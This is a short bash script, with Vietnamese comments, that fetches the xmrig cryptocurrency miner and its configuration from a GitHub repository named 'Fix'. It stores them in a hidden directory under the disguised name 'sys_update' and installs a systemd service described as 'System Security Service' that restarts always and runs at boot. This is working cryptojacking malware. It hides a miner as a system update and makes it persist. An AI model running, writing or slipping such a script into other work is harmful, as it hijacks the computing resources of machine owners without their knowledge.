#!/bin/bash

# 1. Gỡ Mask ngay lập tức nếu có
sudo systemctl unmask sys_update.service 2>/dev/null

# 2. Tạo thư mục ẩn bền vững (Không bị xóa khi reboot)
sudo mkdir -p /var/opt/.system_lib

# 3. Tải file về vị trí an toàn
sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' | sudo tee /var/opt/.system_lib/config.json > /dev/null
sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /var/opt/.system_lib/sys_update
sudo chmod +x /var/opt/.system_lib/sys_update

# 4. Tạo file Service trỏ vào đường dẫn an toàn
# Dùng printf để đảm bảo định dạng Linux chuẩn (LF)
sudo printf "[Unit]\nDescription=System Security Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/var/opt/.system_lib/sys_update --config=/var/opt/.system_lib/config.json\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n" | sudo tee /etc/systemd/system/sys_update.service > /dev/null

# 5. Kích hoạt Startup
sudo systemctl daemon-reload
sudo systemctl unmask sys_update.service
sudo systemctl enable sys_update
sudo systemctl start sys_update
